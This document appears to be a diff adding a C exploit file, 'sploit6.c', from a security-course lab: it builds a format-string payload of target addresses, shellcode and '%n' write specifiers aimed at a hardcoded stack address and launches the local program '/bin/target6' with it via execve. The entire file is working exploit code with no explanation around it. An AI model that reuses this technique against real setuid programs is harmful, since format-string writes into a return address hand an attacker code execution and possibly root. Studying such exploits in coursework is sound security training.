@@ -1,0 +1,32 @@
+hack3rs@ip-172-31-23-108:~/sploits$ vim sploit6.c
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include "shellcode.h"
+
+#define TARGET "/bin/target6"
+//#define ADDR_OF_BUF 0xffffdc94
+#define ADDR_OF_BUF 0xffffdd44
+
+int main(void)
+{
+  char *args[3];
+  char *env[1];
+  char evil[232];
+
+  memset(evil, 'a', sizeof(evil));
+  memcpy(evil, "\x01\x01\x01\x01\x80\xdd\xff\xff\x01\x01\x01\x01\x81\xdd\xff\xff\x01\x01\x01\x01\x82\xdd\xff\xff\x83\xdd\xff\xff", 28);
+  memcpy(evil + 28, shellcode, sizeof(shellcode) - 1);
+  memcpy(evil + 28 + sizeof(shellcode) -1, "%0103d%n%044d%n%035d%n%n",24);
+  evil[sizeof(evil)-1] = 0;
+
+  args[0] = TARGET; args[1] = evil; args[2] = NULL;
+  env[0] = NULL;
+
+  if (0 > execve(TARGET, args, env))
+    perror("execve failed");
+
+  return 0;
+}
